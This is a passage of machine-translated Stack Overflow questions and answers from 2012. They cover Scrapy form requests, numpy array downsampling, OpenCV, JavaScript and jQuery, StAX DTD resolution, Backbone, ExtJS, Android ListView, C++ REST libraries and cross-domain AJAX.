                                        formdata={ "Key":"","Type":"CSS","InitPage":"1","InitURL":"CSSPage_SearchAndBrowseJobs.ASP","SRCH":"earch Jobs","Search":"ISNULL(Requisition.DatePostedExternal, '12/31/9999')¤BETWEEN 1/1/1753 AND Today¥","RetColsQS":"Requisition.Key¤Requisition.JobTitle¤Requisition.fk_Code_Full_Part¤[Requisition.fk_Code_Full_Part]OLD.Description(sysfk_Code_Full_PartDesc)¤Requisition.fk_Code_Location¤[Requisition.fk_Code_Location]OLD.Description(sysfk_Code_LocationDesc)¤Requisition.fk_Code_Dept¤[Requisition.fk_Code_Dept]OLD.Description(sysfk_Code_DeptDesc)¤Requisition.Req¤","RetColsGR":"Requisition.Key¤Requisition.JobTitle¤Requisition.fk_Code_Full_Part¤[Requisition.fk_Code_Full_Part]OLD.Description(sysfk_Code_Full_PartDesc)¤Requisition.fk_Code_Location¤[Requisition.fk_Code_Location]OLD.Description(sysfk_Code_LocationDesc)¤Requisition.fk_Code_Dept¤[Requisition.fk_Code_Dept]OLD.Description(sysfk_Code_DeptDesc)¤Requisition.Req¤","ResultSort":"[sysfk_Code_Full_PartDesc]" },
                                        dont_click = True,
                                        callback=self.parse_fir_pag_urls)]

   def parse_fir_pag_urls(self, response):
       print response' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T15:02:24.883

关键功能是您的回调。例如`parse`方法。它在下载页面时调用，并且该页面的响应作为参数`start_urls`传递给该方法。`parse`

在`parse`您分析（解析）页面的方法中，通常使用[`HtmlXPathSelector`](http://doc.scrapy.org/en/latest/topics/selectors.html#using-selectors)并从该页面收集您需要的数据，并将其放入`Item`. 如果你收集了你需要的所有东西`yield`，scrapy 会检测到它是一个项目并将其传递给管道。

如果您正在解析的页面不包含任何数据（例如它是一个类别页面）或仅包含您需要的部分数据，并且您在其上找到了指向具有 [附加] 数据的其他页面的链接，而不是`yield`ing 一个项目，你产生一个`Request`带有另一个页面的 URL 和另一个回调的实例。

`FormReques`t 是 的子类`Request`，因此您可以根据`FormRequest`需要从 parse 方法中产生尽可能多的 s。

当您最终到达您需要的页面时，在相应的解析方法中提取数据（使用 HtmlXPathSelector）并`Item`从该方法中生成一个实例。

# python - 通过求和降低数组的分辨率

> ID：10685654
> 
> 赞同：12
> 
> 时间：2012-05-21T12:55:25.280
> 
> 标签：python, numpy

如果我有这样的数组：

```
a = np.array([[ 1, 2, 3, 4],
              [ 5 ,6, 7, 8],
              [ 9,10,11,12],
              [13,14,15,16]]) 
```

我想“更改分辨率”，并最终得到一个较小的数组（比如 2 行乘 2 列，或 2 行乘 4 列等）。我希望通过求和来发生这种分辨率变化。我需要它来处理大型数组，较小数组的行数和列数将始终是较大数组的一个因素。

将上述数组减少为 2 x 2 数组将导致（这就是我想要的）：

```
[[ 14\.  22.]
 [ 46\.  54.]] 
```

我有这个功能很好：

```
import numpy as np

def shrink(data, rows, cols):
    shrunk = np.zeros((rows,cols))
    for i in xrange(0,rows):
        for j in xrange(0,cols):
            row_sp = data.shape[0]/rows
            col_sp = data.shape[1]/cols
            zz = data[i*row_sp : i*row_sp + row_sp, j*col_sp : j*col_sp + col_sp]
            shrunk[i,j] = np.sum(zz)
    return shrunk

print shrink(a,2,2)
print shrink(a,2,1)
#correct output:
[[ 14\.  22.]
 [ 46\.  54.]]
[[  36.]
 [ 100.]] 
```

我已经浏览了这些[示例](http://scipy.org/Numpy_Example_List_With_Doc)，但似乎找不到任何有帮助的东西。

有没有更快的方法来做到这一点，而不需要循环？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-05-21T13:08:50.747

用你的例子：

```
a.reshape(2,2,2,2).sum(axis=1).sum(axis=2) 
```

返回：

```
array([[14, 22],
       [46, 54]]) 
```

现在让我们创建一个通用函数……</p>

```
def shrink(data, rows, cols):
    return data.reshape(rows, data.shape[0]/rows, cols, data.shape[1]/cols).sum(axis=1).sum(axis=2) 
```

适用于您的示例：

```
In [19]: shrink(a, 2,2)
Out[19]: 
array([[14, 22],
       [46, 54]])

In [20]: shrink(a, 2,1)
Out[20]: 
array([[ 36],
       [100]]) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T13:03:52.070

> 我敢肯定，没有所有这些可怕的循环，有更好/更智能的方法......

这是避免显式循环遍历 的每个元素的一种方法`data`：

```
def shrink(data, rows, cols):
  row_sp = a.shape[0] / rows
  col_sp = a.shape[1] / cols
  tmp = np.sum(data[i::row_sp] for i in  xrange(row_sp))
  return np.sum(tmp[:,i::col_sp] for i in xrange(col_sp)) 
```

在我的机器上，这比您的版本（对于`shrink(a, 2, 2)`）快 30%。

# c++ - 在服务器上编译 OpenCV / C++ 应用程序

> ID：10685657
> 
> 赞同：0
> 
> 时间：2012-05-21T12:55:30.713
> 
> 标签：c++, opencv, g++

我想创建一个在服务器上运行的使用 OpenCV 的 c++ 应用程序。为此，我需要在我的服务器上编译 c++ 应用程序。但是，我怎样才能在服务器上获取我的 OpenCV 库（和其他库）？还是有另一种方法可以让我的 C++ 应用程序在我的服务器上运行？即在我自己的计算机上而不是在服务器上编译。

我希望你能帮帮我！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:02:03.990

如果服务器是相同的架构（例如，都是 intel x86 32 位或都是 PowerPC），您应该能够在自己的机器上编译并在服务器上运行它。

*此外，正如下面 jlengrand 所指出的，您可以为您的计算机设置几乎任何目标架构的交叉编译器。这基本上可以让你输入一个单行命令来设置你的编译环境，然后当你调用 g++ 或你正在使用的任何东西时，它将为交叉编译器的架构构建。*

我对 OpenCV 了解不多，但只要您将其设置为“***静态链接***”这些库，那么它们就应该是您生成的可执行文件的一部分。因此，可执行文件将包含所有库，并且可以在具有您计算机体系结构的任何计算机上运行。

注意***动态链接***，因为这意味着当您运行可执行文件时，库本身必须存在并且可以在服务器上定位（动态链接意味着共享库，它们不是可执行文件的一部分，必须单独提供。虽然动态链接确实更好，因为可以共享和更新内容，但部署起来更复杂）。

# javascript - JavaScript：如何根据选择框中选择的选项制作 div 的样式？

> ID：10685667
> 
> 赞同：1
> 
> 时间：2012-05-21T12:56:09.833
> 
> 标签：javascript, html, forms

JavaScript

```
function displayContent()
    {
        var 1 = getElementById(1);
        var 2 = getElementById(2);
        var 3 = getElementById(3);
        var 4 = getElementById(4);

        if(document.form.list.selectedIndex==0) {
        1.style.display = "block";
        }
        if(document.form.list.selectedIndex==1) {
        2.style.display = "block";
        }
        if(document.form.list.selectedIndex==2) {
        3.style.display = "block";
        }
        if(document.form.list.selectedIndex==3) {
        4.style.display = "block";
        }
    } 
```

HTML

```
 <form id="form">
    <select onchange="displayContent();" id="list">
                        <option>1</option>
                        <option>2</option>
                        <option>3</option>
                        <option>4</option>
                    </select>
    </form>
    <div id="1">Content1</div>
    <div id="2">Content2</div>
    <div id="3">Content3</div>
    <div id="4">Content4</div> 
```

这是我放在一起的脚本和标记。在此之前我尝试了几种不同的方法，但所有方法都导致相同的非解决方案，就像这个一样。当我更改选择框中的选项时，没有任何反应。我错过了什么吗？

默认情况下，所有 div 都设置为`display:none;`.

谢谢，乔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:01:19.037

您的代码有几个问题，包括缺少`document.`from `getElementById`、没有为您的`form`或`select`元素提供`name`属性以便您可以在 js 中引用它们、尝试创建以整数开头的变量并具有以整数`id`开头的属性。

考虑到这一切，试试这个：

```
function displayContent() {
    var div1 = document.getElementById("div1");
    var div2 = document.getElementById("div2");
    var div3 = document.getElementById("div3");
    var div4 = document.getElementById("div4");

    if(document.form.list.selectedIndex==0) {
        div1.style.display = "block";
    }
    if(document.form.list.selectedIndex==1) {
        div2.style.display = "block";
    }
    if(document.form.list.selectedIndex==2) {
        div3.style.display = "block";
    }
    if(document.form.list.selectedIndex==3) {
        div4.style.display = "block";
    }
} 
```

[**示例小提琴**](http://jsfiddle.net/bSYMG/1/)

* * *

另请注意，这可以大大简化：

```
function displayContent() {
    document.getElementById("div" + (document.form.list.selectedIndex + 1)).style.display = "block";
} 
```

[**示例小提琴**](http://jsfiddle.net/bSYMG/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:00:35.887

代替

```
getElementById 
```

利用

```
document.getElementById('1');
document.getElementById('2');
document.getElementById('3');
document.getElementById('4'); 
```

# xml - 如何将相关系统 DTD 加载到 StAX 解析器中？

> ID：10685668
> 
> 赞同：6
> 
> 时间：2012-05-21T12:56:11.103
> 
> 标签：xml, dtd, stax, woodstox

我正在使用woodstox 为XML 文件实现StAX 解析器。假设我在文件系统的公共目录中的某处有一个有效的 XML 文件，该文件具有匹配的 DTD。

```
/path/to/test.xml
/path/to/test.dtd 
```

XML 使用相对系统标识符声明对其 DTD 的引用，如下所示：

```
<!DOCTYPE test SYSTEM "test.dtd"> 
```

从验证的角度来看，对我来说一切都很好。（是吗？xmllint 不会抱怨。）但是，当我尝试使用下面的代码解析文件时，woodstox 会抛出*java.io.FileNotFoundException*，因为它找不到相关的 DTD 文件。在我看来，该实现尝试访问相对于工作目录而不是相对于 XML 文件对象的 DTD 文件。

```
import java.io.FileInputStream;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamConstants;
import javax.xml.stream.XMLStreamReader;

public class Test {

    public static void main( String[] args ) throws Exception {

        FileInputStream fileInputStream = new FileInputStream( args[0] );
        XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        XMLStreamReader xsr = xmlInputFactory.createXMLStreamReader(fileInputStream);

        while( xsr.hasNext() ) {
            if( xsr.next() == XMLStreamConstants.DTD ) {
                System.err.println( xsr.getText() );
            }
        }
    }
} 
```

1.  这是故意的吗？
2.  有没有一种方便的方法可以说服 StAX 解析器加载相对于给定 XML 文件而不是相对于工作目录的 DTD？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T15:11:23.757

您将需要提供您自己的[**`XMLResolver`**](http://docs.oracle.com/javase/6/docs/api/javax/xml/stream/XMLResolver.html)接口实现（在 SAX 世界中它被称为[EntityResolver](http://docs.oracle.com/javase/1.5.0/docs/api/org/xml/sax/EntityResolver.html)）来帮助解析器找到 DTD。`XMLInputFactory`有`setXMLResolver()`可以为你做的方法。

有关该主题的更多信息：

*   [XML 实体和 URI 解析器](http://xerces.apache.org/xml-commons/components/resolver/resolver-article.html)

深入了解一下解析器需要解析 SYSTEM URI 时究竟发生了什么也是一个好主意。例如，Woodstox 有[一个内部（和默认）实现`XMLResolver`](http://grepcode.com/file/repo1.maven.org/maven2/org.codehaus.woodstox/wstx-asl/4.0.0/com/ctc/wstx/sax/WstxSAXParser.java#WstxSAXParser.MyResolver)（以及SAX[和 StAX](http://grepcode.com/file/repo1.maven.org/maven2/org.codehaus.woodstox/woodstox-core-asl/4.1.2/com/ctc/wstx/sax/WstxSAXParser.java#WstxSAXParser.ResolverProxy)[之间的代理`EntityResolver``XMLResolver`](http://grepcode.com/file/repo1.maven.org/maven2/org.codehaus.woodstox/woodstox-core-asl/4.1.2/com/ctc/wstx/sax/WstxSAXParser.java#WstxSAXParser.ResolverProxy)）。看看它对你的 DTD“文件名”做了什么，你就会明白为什么它是这样工作的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-02-25T23:34:57.470

@Pavel Veller 的回答是正确的。这是它的一个具体使用示例：

```
/**
 * Responsible for parsing the specified XML file and creating objects for
 * insertion into the MySQL database.
 * 
 * @author cameronhudson
 *
 */
public class Parser {

  /**
   * Creates a new XMLStreamReader from the specified file.
   * 
   * @param file The relative path of the file to load.
   * @return An XMLStreamReader to be used for parsing.
   */
  private static XMLStreamReader getXmlReader(String filename) {

    // Initialize an XMLStreamReader
    XMLStreamReader reader;

    // Instantiate an XMLInputFactory and set an XMLResolver
    XMLInputFactory factory = XMLInputFactory.newInstance();
    factory.setXMLResolver(new XMLResolver() {

      @Override
      public Object resolveEntity(String publicID, String systemID,
          String baseURI, String namespace) throws XMLStreamException {

        /*
         * The systemID argument is the same dtd file specified in the xml file
         * header. For example, if the xml header is <!DOCTYPE dblp SYSTEM
         * "dblp.dtd">, then systemID will be "dblp.dtd".
         * 
         */
        return Parser.filenameToStream(systemID);
      }

    });

    // Get the XML file as an InputStream.
    InputStream stream = Parser.filenameToStream(filename);

    // Instantiate a new XMLStreamReader.
    try {
      reader = factory.createXMLStreamReader(stream);
    } catch (XMLStreamException e) {
      System.err.println(e);
      return null;
    }
    return reader;
  }

  /**
   * Converts a local resource filename into a path dependent on the runtime
   * environment.
   * 
   * @param filename The local path of the resource within /src/main/resources/.
   * @return An input stream of the file.
   */
  private static InputStream filenameToStream(String filename) {
    return Thread.currentThread().getContextClassLoader()
        .getResourceAsStream(filename);
  }

} 
```

# backbone.js - 一个视图连接到多个模型

> ID：10685673
> 
> 赞同：9
> 
> 时间：2012-05-21T12:56:30.503
> 
> 标签：backbone.js

我有以下问题……</p>

`MyView`它连接到两个视图：`TaskModel`和`UserModel`

```
TaskModel = {id: 1, taskName: "myTask", creatorName: "myName", creator_id: 2 },
UserModel = {id: 2, avatar: "someAvatar"} 
```

视图应该显示

```
{{taskName}}, {{creatorName}}, {{someAvatar}} 
```

如您所见， fetch`TaskModel`应该`UserModel`是同步的，因为`userModel.fetch`需要`taskModel.get("creator_id")`

您建议我使用哪种方法来显示/处理视图和两个模型？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-21T15:53:20.210

您可以使视图足够智能，以便在它拥有所需的一切之前不渲染。

假设您有一个用户和一个任务，并将它们都传递给视图的构造函数：

```
initialize: function(user, task) {
    _.bindAll(this, 'render');
    this.user = user;
    this.task = task;
    this.user.on('change', this.render);
    this.task.on('change', this.render);
} 
```

现在您有一个视图，它同时引用了用户和任务，并且正在监听`"change"`两者上的事件。然后，该`render`方法可以询问模型是否拥有他们应该拥有的一切，例如：

```
render: function() {
    if(this.user.has('name')
    && this.task.has('name')) {
        this.$el.append(this.template({
            task: this.task.toJSON(),
            user: this.user.toJSON()
        }));
    }
    return this;​​​​
} 
```

所以`render`将等到`this.user`和`this.task`都完全加载后才填充正确的 HTML；如果在加载模型之前调用它，则它不呈现任何内容并返回一个空占位符。这种方法将所有视图的逻辑很好地隐藏在它所属的视图中，并且很容易泛化。

演示：http: [//jsfiddle.net/ambiguous/rreu5jd8/](http://jsfiddle.net/ambiguous/rreu5jd8/)

* * *

您还可以使用 Underscore [`isEmpty`](http://underscorejs.org/#isEmpty)（[混合到 Backbone 模型](http://backbonejs.org/#Model-Underscore-Methods)中）而不是检查特定属性：

```
render: function() {
    if(!this.user.isEmpty()
    && !this.task.isEmpty()) {
        this.$el.append(this.template({
            task: this.task.toJSON(),
            user: this.user.toJSON()
        }));
    }
    return this;​​​​
} 
```

这假设您当然没有任何默认值。

演示：http: [//jsfiddle.net/ambiguous/4q07budc/](http://jsfiddle.net/ambiguous/4q07budc/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-21T13:55:38.987

jQuery 的 Deferreds 在这里工作得很好。作为一个粗略的例子：

```
var succesFunction = function () {
    console.log('success');
};
var errorFunction = function () {
    console.log('error');
};

$.when(taskModel.fetch(), userModel.fetch()).then(successFunction, errorFunction); 
```

您还可以通过使用原始数据来管道请求（请记住，`fetch`, `save`,`create`实际上只是 jQuery`$.ajax`对象的包装器。

```
var taskModelDeferred = taskModel.fetch();
var userModelDeferred = taskModelDeferred.pipe(function( data ) {
    return userModel.fetch({ data: { user: data.userId }});
}); 
```

**注意：**默认情况下，Backbone 在集合和模型上的成功/错误函数中返回集合和模型，所以如果你需要这个，请确保有一个方便的参考。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-22T16:54:59.610

我在使用两个模型和多个视图的复杂布局中遇到了同样的问题。为此，我没有尝试同步提取，而是简单地使用一个模型的“成功”功能来调用另一个模型的提取。我的观点只听第二种模式的变化。例如：

```
var model1 = Backbone.Model.extend({
    ...
});
var model2 = Backbone.Model.extend({
    ...
});

var view1 = Backbone.View.extend({
    ...
});
var view2 = Backbone.View.extend({
    ...
});

model2.on("change",view1.render, view1);
model2.on("change",view2.render, view2); 
```

然后...

```
model1.fetch({
    success : function() {
        model2.fetch();
    }
}); 
```

关键是您不必进行任何复杂的同步。您只需级联提取并响应最后一个模型的提取。

# javascript - EXTJS，无法将事件处理程序绑定到控制器

> ID：10685674
> 
> 赞同：0
> 
> 时间：2012-05-21T12:56:35.050
> 
> 标签：javascript, node.js, extjs

我将 EXTJS 与 Node.JS 一起使用，并且在 EXTJS MVC 框架的上下文中处理事件时遇到了困难。

在视图的类定义中定义事件侦听器时，我已经能够轻松地注册点击事件，但似乎无法将此代码移动到控制器中。

这是我当前的代码：

```
//Icon.JS (VIEW)

Ext.define('GeekFlicks.view.Icon', {
    extend: 'Ext.button.Button',
    alias: 'widget.icon',
    height: 48,
    width: 48,
    text: 'icon',
    draggable: true
}); 
```

//Icon.JS（控制器）

```
Ext.define('GeekFlicks.controller.Icon', {
extend: 'Ext.app.Controller',

models: ['Icon'],
stores: ['Icons'],
views: ['Icon'],

init: function () {
    this.control({          
        'listener': {
            click: function(c) {
                alert('working');
            }
        }
    });
},
}); 
```

任何有关 EXTJS 如何处理此类事件的帮助或解释都将非常有帮助，非常感谢！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:47:51.113

变成`this.control`这样的东西：

```
'icon': {
    click: function(c) {
       alert('working');
    }
} 
```

您基本上需要让控制器知道要控制哪个元素。我还建议阅读有关`refs: []`在控制器中使用以更轻松地访问视觉元素和视图的信息。

# php - 了解推文上的地理位置

> ID：10685677
> 
> 赞同：0
> 
> 时间：2012-05-21T12:56:40.790
> 
> 标签：php, javascript, geolocation, twitter

我正在尝试从推文中获取地理位置。对于我的测试，我发布了地理参考的新推文，但是当我得到它们的 json 时，元素“geo”为空。为什么？他们怎么了？

我不想按范围和地理位置进行搜索：我想搜索一些由特定主题标签索引的推文，然后检索“geo”json 元素。我试图搜索其他推文（不是我的推文），有时我将“geo”元素作为一个完整的对象，并带有坐标数组。

**那么，我该怎么做才能让'geo'元素不为空？**

我做了 4 个地理参考的帖子：[我的推文](https://twitter.com/#!/wilkyx)

位置是：44.694704,10.528611

编辑：添加地理编码参数

这就是我在服务器端所做的（纯 php）：

```
$conn = new OAuth (CONSUMER_KEY, CONSUMER_SECRET);
$conn->setToken (ACCESS_TOKEN, ACCESS_TOKEN_SECRET);
$conn->fetch (API_URL, array ('q' => '#testhashtagandgeo', 'geocode' => '44.694704,10.528611,4km'));
echo $conn->getLastResponse (); 
```

我使用了 PHP OAuth 基础，并且每个常量都定义正确，所以效果很好。

客户端（ExtJS）：

```
Ext.onReady (function () {
    Ext.Ajax.request ({
        url: 'proxy.php' ,
        disableCaching: false ,
        success: function (xhr) {
            var js = Ext.JSON.decode (xhr.responseText);
            Ext.each (js.results, function (tweet) {
                if (tweet.geo !== null) {
                    console.log ('lat = ' + tweet.geo.coordinates[0] + ' - lng = ' + tweet.geo.coordinates[1]);
                }
            });
            console.log (js);
        } ,
        failure: function (xhr) {
            console.log ('something\'s wrong!');
        }
    });
}); 
```

提前致谢。

威尔克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T15:37:17.420

您需要[阅读文档](https://dev.twitter.com/docs/using-search)

> 仅当查询包含地理编码参数并且用户在推文中包含地理信息时，才会包含位置数据。

因此，您需要在查询中添加类似这样的内容

```
&geocode=37.781157,-122.398720,25mi 
```

或您想要的任何位置。

# android - 来自数据库的列表视图

> ID：10685678
> 
> 赞同：0
> 
> 时间：2012-05-21T12:56:40.717
> 
> 标签：android, listview

我在我的应用程序中使用数据库，因为我已经从数据库中获取数据，但我不知道如何在 textview 中显示它。

这是我的代码：

```
super.onCreate(savedInstanceState);
     setContentView(R.layout.report);   
     db.open();
     Cursor c = db.getAllTitles();
     startManagingCursor(c);
     String[] from = new String[] { db.KEY_INCOME };
     int[] to = new int[] { R.id.textView1 };
     SimpleCursorAdapter notes =
                new SimpleCursorAdapter(this, R.layout.report, c, from, to); 
```

这里的笔记有数据库值。但不知道如何继续如何在列表视图中显示它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:03:52.140

您需要找到您的列表视图并设置您的适配器。（假设您没有使用 ListActivity）

```
ListView list = (ListView) this.findViewById(R.id.yourlistview);
list.setAdapter(notes); 
```

如果您使用的是 ListActivity（或 ListFragment），则更简单，因为框架假定您使用的是某个 id，您可以像这样设置适配器：

```
setListAdapter(notes); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:11:30.593

这样做

```
String[] titles= new String[] {c.TITLE };

        int[] view = new int[] { R.id.textview };     

        SimpleCursorAdapter mAdapter = new SimpleCursorAdapter(this, R.layout.list_example_entry, c, titles, view ); 
```

listview.setAdapter(注释);

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:22:52.230

如果你想在列表项上设置设置 Tesxt 点击你可以做我喜欢

```
@Override
        protected void onListItemClick(ListView l, View v, int position, long id) {
            Cursor c = (Cursor) arg0.getAdapter().getItem(arg2);

tv.setTextt(c.getString(1));

    } 
```

# jquery - 如何在容器内进行 2 个选择？

> ID：10685681
> 
> 赞同：1
> 
> 时间：2012-05-21T12:56:46.330
> 
> 标签：jquery, selector

我想在容器（容器）内进行 2 个选择。代码如下所示：

```
 <div id="Container">
        <div id="Div6" class="one">A</div>
        <div id="Div7" class="two">B</div>
        <div id="Div8" class="one">C</div>
        <div id="Div9" class="two">D</div>
        <div id="Div10" class="one">E</div>
    </div> 
```

首先，我想选择所有具有“one”类的元素，而不是在包裹的 3 个元素（Div6、Div8 和 Div10）中只选择 Div10？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:01:07.827

简单的答案是独立选择它们，如下所示：

```
$('.one') //a collection of elements whith class .one
$('#Div10') //the element with ID Div10 
```

如果由于某种原因您必须先选择类，然后仅过滤掉具有正确 ID 的元素，请执行以下操作：

```
var elm = $('.one').filter('#Div10'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:01:24.270

```
$('#Container .one').doFoo().filter('#Div10').fooElse(); 
```

**例子：**

```
$('#Container .one').fadeOut()
                    .filter('#Div10').fadeIn();​ 
```

[**现场演示**](http://jsfiddle.net/AxAJn/1)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:01:25.020

你需要它是两个步骤吗？首先可以调用`$('#Div10')`直接获取div。或用于`$('.one#Div10')`仅获取具有 class `one`AND id的 div `Div10`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T13:02:47.710

这个选择器获得 3 个带类的 div`one`

```
$('#Container > .one'); 
```

减少选择，从上一个开始

```
$('#Container > .one').filter($('#Div10')); 
```

查看[`filter()`](http://api.jquery.com/filter/)文档

# ruby-on-rails - Ruby on Rails 的最佳 Wiki Gem 是什么？

> ID：10685683
> 
> 赞同：4
> 
> 时间：2012-05-21T12:57:00.983
> 
> 标签：ruby-on-rails, rubygems, wiki

我正在为 RoR 寻找一个 Wiki Gem，它具有：

*   基本的 Wiki 功能（显然），
*   所有条目的历史功能，
*   使用 MySQL（无 SQLite），
*   可选地，我们想在模板中定义一些要使用的字段，而不是使用文章……</li>

如果我不得不举一个使用类似功能的网站的例子，那就是 CrunchBase。它是一个类似于 wiki 的系统，具有预定义的字段。

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:59:55.137

Rails 本身没有 Wiki gem。您所拥有的是一些有助于开发 Wiki 的宝石，就像您在此处寻找的一样。

对于版本控制，我推荐[vestal_versions](https://github.com/laserlemon/vestal_versions)，对于渲染Markdown，我推荐[BlueCloth](http://deveiate.org/projects/BlueCloth)。这两种宝石都已经推出了一段时间，并且非常成熟且经过了良好的测试。

vestal_versions 也与 DB 无关，因为它搭载 ActiveRecord 功能，因此它可以在您使用的任何 RDBMS 中工作。

# iphone - 使用 og:latitude 和 og:longtitide 元标记按位置显示附近

> ID：10685696
> 
> 赞同：2
> 
> 时间：2012-05-21T12:57:49.367
> 
> 标签：iphone, facebook, cocoa-touch, facebook-graph-api

我正在尝试在我要分享的网页中添加以下两个元标记，

```
<meta property="og:latitude" content="37.416343"/> <meta property="og:longitude" content="-122.153013"/> 
```

目的是利用我在 Facebook 帖子中服务器中的位置数据。因此，当用户从我的移动应用分享链接时，该链接指向的网页将包含此元数据信息。但是我在我的帖子上看不到任何位置信息。

我在这里想念什么？

我已经验证了命名空间并尝试将“og：type”更改为“cafe”。

# c++ - c++ lib 为初学者使用 REST api

> ID：10685697
> 
> 赞同：17
> 
> 时间：2012-05-21T12:57:50.060
> 
> 标签：c++, json, rest

我将在 C++ 中使用 dropbox rest api 做一些事情，并且我正在寻找一个易于使用的库。

有谁知道我需要什么功能？（我只是模糊地知道 REST api 是什么）

我相信我需要 HTTP 协议功能和 XML 解析功能，以及 JSON 对吗？还有什么？

您会向我推荐哪个易于使用且易于学习的库？

我找到了[POCO C++](http://pocoproject.org/)，它看起来很简单，但我没有找到任何 JSON 功能......

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-05T20:43:01.187

The [C++ REST SDK](http://casablanca.codeplex.com) might have what you are looking for. It has a JSON parser and HTTP Client APIs that are very easy to use. You can check out the project on codeplex.

**Edit - 05/2016**

The Microsoft C++ REST SDK project has moved to Github at [Microsoft/cpprestsdk](https://github.com/Microsoft/cpprestsdk) which says:

> The C++ REST SDK is a Microsoft project for cloud-based client-server communication in native code using a modern asynchronous C++ API design. This project aims to help C++ developers connect to and interact with services.

The README.md has the following synopsis of what is in the SDK.

> Features - HTTP client/server, JSON, URI, asynchronous streams, WebSockets client, oAuth
> 
> PPL Tasks - A powerful model for composing asynchronous operations based on C++ 11 features
> 
> Platforms - Windows desktop, Windows Store, Windows Phone, Ubuntu, OS X, iOS, and Android
> 
> Support for Visual Studio 2012, 2013, and 2015 with debugger visualizers
> 
> NuGet package with binaries for Windows and Android platforms

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T20:40:48.580

您看过[ffead-cpp 吗](http://code.google.com/p/ffead-cpp/)，它为 REST 和 SOAP 服务提供了出色的支持。

# c++ - OpenCV 错误：断言失败 (cvsnakeimage)

> ID：10685701
> 
> 赞同：2
> 
> 时间：2012-05-21T12:58:17.883
> 
> 标签：c++, opencv

```
CvPoint _pointsArray[5];
float _g_alpha;
float _g_beta;
float _g_gamma;
_g_alpha = 0.78f;
_g_beta = 0.28f;
_g_gamma = 0.32f;
_criteria.type = CV_TERMCRIT_ITER;
_pointsArray[0].x =1;
_pointsArray[0].y =1;
_pointsArray[1].x =1;
_pointsArray[1].y =1;
_pointsArray[2].x =1;
_pointsArray[2].y =1;
_pointsArray[3].x =1;
_pointsArray[3].y =1;
_pointsArray[4].x =1;
_pointsArray[4].y =1;
IplImage* temp;
temp = _inImage->getIplImage();
cvSnakeImage(temp,_pointsArray,5,&_g_alpha,&_g_beta,&_g_gamma,CV_VALUE,win,_criteria,false); 
```

上面的代码总是给我这个错误

```
OpenCV Error: Assertion failed ((icvSnake8uC1R( data, step, size, points, length, alpha, beta, gamma, coeffUsage, win, criteria, calcGradient ? 2 : 1 )) >= 0) in unknown function, file .\src\snakes.cpp, line 425 
```

有谁知道这是什么原因？？？？？？

谢谢。

解决了谢谢。问题是胜利的大小是偶数而不是奇数！

# ajax - 由于 https 和 http 页面之间存在跨域问题。Ajax 调用失败

> ID：10685704
> 
> 赞同：0
> 
> 时间：2012-05-21T12:58:25.973
> 
> 标签：ajax, jquery-mobile, cross-domain

我有一个网站说 xyz.com。我想从 say(http://pqr.xyz.com) 到[https://abc.xyz.com](https://abc.xyz.com)进行 ajax 调用。但由于跨域问题，调用无法执行。有什么方法可以克服这个问题。xan 我如何通过 https 访问该页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:04:02.717

使用服务器端代理或 JSON

[http://devlog.info/2010/03/10/cross-domain-ajax](http://devlog.info/2010/03/10/cross-domain-ajax)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:00:56.697

如果要进行跨域调用，则需要使用[JSONP](http://en.wikipedia.org/wiki/JSONP)。

这意味着您可以更改服务器代码，以便标头显示此跨域调用已授权。根据您的服务器语言，您必须执行以下操作：

```
w.Header().Set("Access-Control-Allow-Origin", "*")
w.Header().Set("Access-Control-Request-Method", "GET")
w.Header().Set("content-type", "application/x-javascript") // this one of course for json calls 
```

使用 JSONP 而不是 JSON 也意味着您将 JSON 包含在函数调用中，例如

```
acceptServerAnswer({'thisis':'myjson']) 
```

# c# - 从 RichTextBox 禁用最小化/最大化组件

> ID：10685709
> 
> 赞同：0
> 
> 时间：2012-05-21T12:58:54.700
> 
> 标签：c#, winforms, visual-studio-2010

这可能是一个简单的问题...我想禁用 RichTextBox 中的最小化/最大化组件。我试图检查 RichTextBox 的属性，但无法成功禁用这些组件。

我想保留`x`关闭组件，但我想禁用 RichTextBox 中的最小化/最大化组件。

```
 private void button1_Click(object sender, EventArgs e)
        {          
            ShowRichMessageBox(FileSelected, File.ReadAllText(FileSelected));
        }

 private void ShowRichMessageBox(string title, string message)
        {
            RichTextBox rtbMessage = new RichTextBox();

            rtbMessage.Text = message;          

            Form RichMessageBox = new Form();
            RichMessageBox.Text = title;

            RichMessageBox.Controls.Add(rtbMessage);
            RichMessageBox.ShowDialog();
        } 
```

这个想法是在读取文件的 RichTextBox 中显示一条消息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:15:34.600

使用 的`MinimizeBox`和`MaximizeBox`属性`Form`。试试这个：

```
private void ShowRichMessageBox(string title, string message)
        {
            RichTextBox rtbMessage = new RichTextBox();

